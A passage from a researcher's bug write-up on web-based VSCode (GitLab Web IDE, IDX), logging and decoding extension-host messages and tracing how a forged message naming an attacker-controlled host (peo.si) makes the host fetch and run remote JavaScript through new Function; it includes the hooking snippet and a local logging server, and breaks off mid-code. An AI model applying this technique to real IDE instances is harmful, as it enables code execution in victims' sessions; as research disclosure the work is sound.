<p><img src="/tmp/cdn-images/Pasted%20image%2020250715094955.png" alt="Pasted image 20250715094955.png" />
<br />
When I tried modyfing the hex data locally, it was all gibberish format when decoding it turns out the problem is with how Windows new lines differ from Linux os quick fix</p>

<p>In Linux based OS it‚Äôs supposed to be <code class="language-plaintext highlighter-rouge">\n</code> while in Windows it‚Äôs <code class="language-plaintext highlighter-rouge">\r\n</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Now as we have shortened the payload being sent we can debug side by side one tab for Gitlab and one tab for IDX and step by step debug where the code path changes.</p>

<hr />

<h2 id="deep-dive-into-vscode">Deep Dive into VSCode</h2>

<p>I also wanted to see the message logs from IDX to see if it had the same message which included the resource from where the extension were loaded.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715112749.png" alt="Pasted image 20250715112749.png" />
<br />
Inside the worker script the message handling was done here, which decoded the buffer data
So I needed to hook this method and forward all the message eg to suppose a local web server which would append the data to a file.</p>

<p>You could do this with <a href="https://github.com/kevin-mizu/domloggerpp">domlogger++</a> also I believe but noob me couldn‚Äôt figure out (an awesome extension by  <a href="https://x.com/kevin_mizu">Kevin Mizu</a> , if you are into client side security do give it a try ) , so I fallback to match and replace option which worked really fine, it basically encodes the buffer data into hex then sends the data to a local web server which saves the result into a file.</p>

<p>I performed almost all actions to have proper logs I even installed some extensions from marketplace hoping the same would appear in logs.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Match</span>
<span class="k">return</span><span class="p">}</span><span class="nx">a</span><span class="p">.</span><span class="nf">fire</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>

<span class="nx">Replace</span>
<span class="k">return</span><span class="p">}</span><span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">){</span><span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);}</span><span class="nf">fetch</span><span class="p">(</span><span class="s2">`http://127.0.0.1:3000/save`</span><span class="p">,{</span><span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="na">body</span><span class="p">:</span><span class="nf">buf2hex</span><span class="p">(</span><span class="nx">S</span><span class="p">)});</span><span class="nx">a</span><span class="p">.</span><span class="nf">fire</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715113610.png" alt="Pasted image 20250715113610.png" /></p>

<p>Then i decoded the logged hex messages but still couldn‚Äôt find anything related to resource part, tried the same in Gitlab it did appear there. So in case of Gitlab the vulnerable sink was automatically called but here in IDX it isn‚Äôt being called.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715125836.png" alt="Pasted image 20250715125836.png" />
<br />
<br /></p>

<p>Also another trick is to use Conditional breakpoint (if you don‚Äôt want to use match and replace), that code will be executed automatically when the bp is reached.
<br />
<br /></p>
<center><iframe width="560" height="315" src="https://www.youtube.com/embed/aDcK6Z6K2Zc?si=MWTgZC5WOr-0Yz-0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></center>
<p><br /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715130014.png" alt="Pasted image 20250715130014.png" />
<br />
<br />
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì</p>

<h2 id="analyzing-the-messages">Analyzing the Messages</h2>

<blockquote>

  <p>1st message</p>
</blockquote>

<p>It‚Äôs very long json string</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"commit"</span><span class="p">:</span><span class="s2">"91cf69e7f84d84beda2be5f9bbdd8a4f33000083"</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"1.85.2"</span><span class="p">,</span><span class="nl">"quality"</span><span class="p">:</span><span class="s2">"stable"</span><span class="p">,</span><span class="nl">"parentPid"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"environment"</span><span class="p">:{</span><span class="nl">"isExtensionDevelopmentDebug"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"appName"</span><span class="p">:</span><span class="s2">"GitLab Web IDE"</span><span class="p">,</span><span class="nl">"appHost"</span><span class="p">:</span><span class="s2">"web"</span><span class="p">,</span><span class="nl">"appUriScheme"</span><span class="p">:</span><span class="s2">"gitlab-web-ide"</span><span class="p">,</span><span class="nl">"appLanguage"</span><span class="p">:</span><span class="s2">"en"</span><span class="p">,</span><span class="nl">"extensionTelemetryLogResource"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/20240504T182147/exthost/extensionTelemetry.log"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-log"</span><span class="p">},</span><span class="nl">"isExtensionTelemetryLoggingOnly"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"globalStorageHome"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/User/globalStorage"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-userdata"</span><span class="p">},</span><span class="nl">"workspaceStorageHome"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/User/workspaceStorage"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-userdata"</span><span class="p">}},</span><span class="nl">"workspace"</span><span class="p">:{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"-261f9d5d"</span><span class="p">,</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"sub"</span><span class="p">,</span><span class="nl">"transient"</span><span class="p">:</span><span class="kc">false</span><span class="p">},</span><span class="nl">"consoleForward"</span><span class="p">:{</span><span class="nl">"includeStack"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"logNative"</span><span class="p">:</span><span class="kc">false</span><span class="p">},</span><span class="nl">"extensions"</span><span class="p">:{</span><span class="nl">"versionId"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"allExtensions"</span><span class="p">:[{</span><span class="nl">"identifier"</span><span class="p">:{</span><span class="nl">"value"</span><span class="p">:</span><span class="s2">"VSCode.bat"</span><span class="p">,</span><span class="nl">"_lower"</span><span class="p">:</span><span class="s2">"VSCode.bat"</span><span class="p">},</span><span class="nl">"isBuiltin"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"isUserBuiltin"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"isUnderDevelopment"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"extensionLocation"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/bat"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"gitlab.com"</span><span class="p">},</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"bat"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Windows Bat Language Basics"</span><span class="p">,</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">"Provides snippets, syntax highlighting, bracket matching and folding in Windows batch files."</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="nl">"publisher"</span><span class="p">:</span><span class="s2">"VSCode"</span><span class="p">,</span><span class="nl">"license"</span><span class="p">:</span><span class="s2">"MIT"</span><span class="p">,</span><span class="nl">"engines"</span><span class="p">:{</span><span class="s2">"
</span></code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715130747.png" alt="Pasted image 20250715130747.png" />
<br />
Based on the variable naming and all it sounds like it‚Äôs responsible for Initializing  VSCode with information related to such as extensions what all activation events are supported by them</p>

<p>Moving onto the next one</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x02H\x18$initializeConfiguration\x00\x01I\x05[{"defaults":{"contents":{"editor":{"tabSize":4,"indentSize":"tabSize","insertSpaces":true,"detectIndentation":true,"trimAutoWhitespace":true,"largeFileOptimizations":true,"wordBasedSuggestions":"matchingDocuments","semanticHighlighting":{"enabled":"configuredByTheme"},"stablePeek":false,"maxTokenizationLineLength":20000,"experimental":{"asyncTokenization":false,"asyncTokenizationLogging":false,"asyncTokenizationVerification":false,"dropIntoEditor":{"defaultProvider":{}}},"language"
</code></pre></div></div>

<p>Searching for <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> we can see there is indeed a function with the same name, if we set a breakpoint there it actually gets hit</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715135829.png" alt="Pasted image 20250715135829.png" />
<br /></p>
<blockquote>

  <p>3rd message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">initializeTelemetryLevel</code> method no idea what it does</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x03\x00\x00\x00\nÔøΩ\x19$initializeTelemetryLevel\x03\x01\x00\x00\x00\x010\x01\x00\x00\x00\x05false\x04'
</code></pre></div></div>

<blockquote>

  <p>4th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">startExtensionHost</code> method</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x13[\x13$startExtensionHost\x00\x00\x00`[{"versionId":1,"toRemove":[],"toAdd":[],"addActivationEvents":{},"myToRemove":[],"myToAdd":[]}]'
</code></pre></div></div>

<blockquote>

  <p>5th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">activateByEvent</code> method here it‚Äôs registering the event and the extension <code class="language-plaintext highlighter-rouge">gitlab-web-ide</code> needs to be invoked for that particular event <code class="language-plaintext highlighter-rouge">onAuthenticationRequest</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x15[\x10$activateByEvent\x00\x00\x00,["onAuthenticationRequest:gitlab-web-ide",0]'
</code></pre></div></div>

<blockquote>

  <p>6th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">initializeWorkspace</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[{"isUntitled":false,"folders":[{"uri":{"$mid":1,"fsPath":"/sub","external":"gitlab
web-ide:/sub","path":"/sub","scheme":"gitlab-web
ide"},"name":"sub","index":0}],"id":"-261f9d5d","name":"sub","transient":false},true
 ]
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724110921.png" alt="Pasted image 20250724110921.png" /></p>

<p>Null messages:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x07\x00\x00\x00\x01
\x07\x00\x00\x00\x02
\x07\x00\x00\x00\n
</code></pre></div></div>

<p>And the final message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00\x11\x00\x00\x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}'
</code></pre></div></div>

<p>I am directly jumping to the final method where this message is handled:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="k">async</span> <span class="nf">vb</span><span class="p">(</span><span class="nx">$</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">v</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span>
                        <span class="na">path</span><span class="p">:</span> <span class="nc">S</span><span class="p">(</span><span class="nx">v</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.js</span><span class="dl">"</span><span class="p">)</span>
                    <span class="p">});</span>
                    <span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">$</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
                    <span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
                      <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">));</span>
                    <span class="k">if </span><span class="p">(</span><span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/didFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                    <span class="nx">r</span><span class="p">.</span><span class="nx">status</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">statusText</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">r</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
                      <span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">v</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">)}</span><span class="s2">#VSCode-extension`</span>
                      <span class="p">,</span> <span class="nx">h</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">a</span><span class="p">}</span><span class="s2">
//# sourceURL=</span><span class="p">${</span><span class="nx">c</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
                    <span class="kd">let</span> <span class="nx">i</span><span class="p">;</span>
                    <span class="k">try</span> <span class="p">{</span>
                        <span class="nx">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">module</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">exports</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">,</span><span class="nx">h</span><span class="p">)</span>
                    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="nx">o</span> <span class="p">?</span> <span class="s2">`Loading code for extension </span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2"> failed: </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="s2">`Loading code failed: </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">v</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">)}${</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">.</span><span class="nx">line</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="p">?</span> <span class="s2">` line </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">line</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="dl">""</span><span class="p">}${</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">.</span><span class="nx">column</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="p">?</span> <span class="s2">` column </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">column</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="dl">""</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span>
                        <span class="nx">b</span>
                    <span class="p">}</span>
</code></pre></div></div>

<p>The arguments values passed to this method can be seen in the below ss
<img src="/tmp/cdn-images/Pasted%20image%2020250724111800.png" alt="Pasted image 20250724111800.png" />
<br />
The <code class="language-plaintext highlighter-rouge">v</code> variable contains the following, it looks same as what we passed arbitrarily but look at the authority  and path part they actually point to the original location of the extension resource.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span><span class="p">{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/main.js"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"gitlab.com"</span><span class="p">}</span><span class="err">'</span><span class="w">
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">$</code> and <code class="language-plaintext highlighter-rouge">v</code>  argument value is actually  populated from the very first message remember that long ass json.</p>

<p>Not sure about <code class="language-plaintext highlighter-rouge">a</code> it contains a bunch of boolean values. If  I try to change the above values directly in the first message it does appear as it is at this function call. But the real magic is happening here</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
</code></pre></div></div>

<p>If you do step in from here , you will end up at this line <code class="language-plaintext highlighter-rouge">u.fire(D)</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">decode</span><span class="p">(</span><span class="nx">D</span><span class="p">.</span><span class="nx">buffer</span><span class="p">)</span>
<span class="dl">'</span><span class="se">\t\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x11</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}</span><span class="dl">'</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">The value returned by</code>await this.C.$asBrowserUri(v)<code class="language-plaintext highlighter-rouge">statement is this. After which the value is passed to</code>I.URI.revive`  method</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724115251.png" alt="Pasted image 20250724115251.png" />
<br />
<code class="language-plaintext highlighter-rouge">new R</code> looks similar to <code class="language-plaintext highlighter-rouge">new URL</code> meant for parsing the url
The returned parsed url is then passed to fetch call eg <code class="language-plaintext highlighter-rouge">https://peo.si/gl/editor/include.js</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="kd">const</span> <span class="nx">ge</span> <span class="o">=</span> <span class="nx">F</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">C</span><span class="p">,</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">K</span><span class="p">,</span> <span class="nx">z</span><span class="p">,</span> <span class="o">!!</span><span class="nx">L</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">f</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">ge</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">C</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${(</span><span class="mi">0</span><span class="p">,</span>
                    <span class="nx">R</span><span class="p">.</span><span class="nx">$Dv</span><span class="p">)(</span><span class="nx">O</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">K</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">U</span><span class="p">),</span>
                    <span class="k">this</span><span class="p">.</span><span class="nx">c</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">ge</span><span class="p">),</span>
                <span class="nf">decode</span><span class="p">(</span><span class="nx">ge</span><span class="p">.</span><span class="nx">buffer</span><span class="p">)</span>
<span class="dl">'</span><span class="se">\</span><span class="s1">x01</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x11/</span><span class="se">\r</span><span class="s1">$asBrowserUri</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00ÔøΩ[{"$mid":1,"path":"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/mains.js","scheme":"https","authority":"gitlab.com"}]</span><span class="dl">'</span>
</code></pre></div></div>

<p>Rest of the code flow is simple it makes a request to that url (which is full controlled by us) , the response is then added to the <code class="language-plaintext highlighter-rouge">h</code> variable which is later passed to <code class="language-plaintext highlighter-rouge">new Function</code> later when this method will be called it will execute whatever code was returned in the response</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">module</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">exports</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">,</span><span class="nx">h</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724122029.png" alt="Pasted image 20250724122029.png" /></p>

<hr />

<p>To demonstrate the pitfalls in detail I will be taking example of a local VSCode web instance as IDX has made some changes and I don‚Äôt have proper notes so can‚Äôt explain properly. It means I will be reproducing my own bug from past figuring out what I did why I did.</p>

<p>After setting up the VSCode web server up , if we pass the same hex data in this. The breakpoint doesn‚Äôt hits not even for the <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> method .</p>

<p>Based on this it seemed each instance have it‚Äôs own configuration the important thing is in the very first message that long ass json value (I will explain the exact root cause later which I figured out while writing this blogpost, for the time being just follow along).</p>

<p>By setting breakpoint to see what original values are being passed there and replace that value in our hex payload file</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725115714.png" alt="Pasted image 20250725115714.png" />
<br />
As I wasn‚Äôt sure why it‚Äôs failing, I decided to do the same as earlier Matan did, log the messages and used them as a base.</p>

<p>And here‚Äôs the web server which basically saves the body into a file.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Origin</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Methods</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">POST, GET, OPTIONS</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Headers</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Origin, X-Requested-With, Content-Type, Accept</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">next</span><span class="p">();</span>
    <span class="p">});</span>


<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">});</span>

<span class="c1">// define a route to handle POST body payload parameter and the save the content to a file ,keep on appending to the same file when recieving new  data</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/save</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">body</span> <span class="o">+=</span> <span class="nx">data</span><span class="p">;</span>
        <span class="p">});</span>
    <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">end</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nf">appendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">mesage.txt</span><span class="dl">'</span><span class="p">,</span> <span class="nx">body</span> <span class="o">+</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">The "data to append" was appended to file!</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">});</span>
